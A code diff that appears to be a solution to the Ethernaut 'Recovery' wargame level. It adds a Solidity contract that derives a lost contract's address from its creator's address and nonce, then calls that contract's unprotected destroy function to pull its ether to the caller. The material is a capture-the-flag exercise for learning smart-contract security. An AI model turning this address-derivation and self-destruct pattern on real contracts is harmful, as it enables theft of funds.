@@ -6,8 +6,29 @@ pragma solidity ^0.8.20;
  * @dev Recover (or remove) the 0.001 ether from the lost contract address.
  */
 
-// contract: 0x9938f099Cb6d3f666C5C168830aDD46952EF421B
-// Used etherscan from our newly created contract instance to get the contract address
-// Then simply call the destroy function with your wallet address
+// Lost address: 0x9938f099Cb6d3f666C5C168830aDD46952EF421B
 
-// 🎉 Level completed! 🎉
+interface ISimpleToken {
+    function destroy(address to) external;
+}
+
+interface IRecovery {}
+
+contract RecoveryService {
+    address private immutable recovery;
+
+    constructor(address _recovery) {
+        recovery = _recovery;
+    }
+
+    function recoverAddress() public view returns (address) {
+        bytes32 hash = keccak256(
+            abi.encodePacked(bytes1(0xd6), bytes1(0x94), recovery, bytes1(0x01))
+        );
+        return address(uint160(uint256(hash)));
+    }
+
+    function recoverFund() public {
+        ISimpleToken(recoverAddress()).destroy(msg.sender);
+    }
+}
